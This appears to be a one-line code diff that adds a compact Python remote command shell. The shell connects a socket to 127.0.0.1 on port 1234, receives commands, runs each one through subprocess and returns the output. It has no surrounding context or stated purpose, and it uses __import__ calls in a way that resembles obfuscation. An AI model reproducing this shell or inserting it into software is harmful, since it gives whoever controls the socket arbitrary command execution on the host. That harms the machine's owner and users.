@@ -1,0 +1,1 @@
+socket=__import__('socket');subprocess=__import__('subprocess');buffer=1024;host='127.0.0.1';s=socket.socket();s.connect((host,1234));exec('while(True):\n\tcommand=s.recv(buffer).decode();output = subprocess.getoutput(command);s.send(output.encode())');s.close()
